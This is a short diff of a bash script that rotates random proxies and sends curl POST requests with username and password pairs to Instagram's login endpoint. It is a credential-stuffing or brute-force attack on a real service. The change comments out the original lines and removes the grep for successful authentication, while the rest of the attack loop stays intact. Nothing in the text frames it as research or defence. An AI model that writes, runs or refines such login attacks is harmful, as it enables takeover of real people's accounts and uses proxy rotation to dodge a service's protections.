@@ -92,10 +92,17 @@ for i in $(seq 1 5); do
               random_proxy_index=$(get_random_number 1 "$proxy_count")
               random_proxy=$(sed -n "${random_proxy_index}p" "$proxy_file")
                echo "Selected proxy: $random_proxy"
-               execute_command "curl -x $random_proxy -s -d \"username=$random_user&password=$random_pass\" https://www.instagram.com/accounts/login/ajax/  | grep \"authenticated\": true  "
+               # original code:
+               # execute_command "curl -x $random_proxy -s -d \"username=$random_user&password=$random_pass\" https://www.instagram.com/accounts/login/ajax/  | grep \"authenticated\": true  "
+               # modified code:
+               execute_command "curl -x $random_proxy -s -d \"username=$random_user&password=$random_pass\" https://www.instagram.com/accounts/login/ajax/"
+
             else
                 echo "No proxy found or proxy file is empty, trying without proxy..."
-                execute_command "curl -s -d \"username=$random_user&password=$random_pass\" https://www.instagram.com/accounts/login/ajax/  | grep \"authenticated\": true  "
+                 # original code:
+                 # execute_command "curl -s -d \"username=$random_user&password=$random_pass\" https://www.instagram.com/accounts/login/ajax/  | grep \"authenticated\": true  "
+                 # modified code:
+                execute_command "curl -s -d \"username=$random_user&password=$random_pass\" https://www.instagram.com/accounts/login/ajax/"
            fi
        else
            echo "Error: User or password not found for testing."
